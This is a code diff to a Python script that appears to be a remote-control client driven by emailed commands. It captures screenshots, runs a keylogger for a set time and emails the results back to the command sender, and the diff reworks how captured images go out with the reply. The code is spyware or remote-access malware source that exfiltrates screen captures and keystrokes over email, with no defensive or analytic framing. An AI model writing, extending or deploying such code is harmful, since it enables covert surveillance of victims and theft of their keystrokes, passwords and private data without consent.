@@ -6,6 +6,7 @@ import ScreenShot
 import Power
 import time
 import os
+import pandas
 
 DEFAULT_KEYLOG_TIME = 300
 
@@ -23,16 +24,14 @@ while True:
     waitCounter = 0 if waitCounter == 3 else waitCounter + 1 
     
     result = ''
-    sent = False
+    image = None
 
     if 'EMPTY' in cmd:
         continue
     os.system('cls')
     if cmd[0] == 'screenshot':
         result = 'Screenshot captured'
-        filename = ScreenShot.capture()
-        email.sendPicture(command[2], 'Screenshot', filename)
-        sent = True
+        image = ScreenShot.capture()
 
     elif cmd[0] == 'keylog':
         keylTime = DEFAULT_KEYLOG_TIME
@@ -93,8 +92,8 @@ while True:
         result = 'Error: Command not found'
     
     sender = command[2]
-    if result != '' and not sent:
-        email.sendEmail(sender, 'Result', result)
+    if result != '':
+        email.sendMail(sender, 'Your request has been executed', result, image)
     time.sleep(1)
     
 
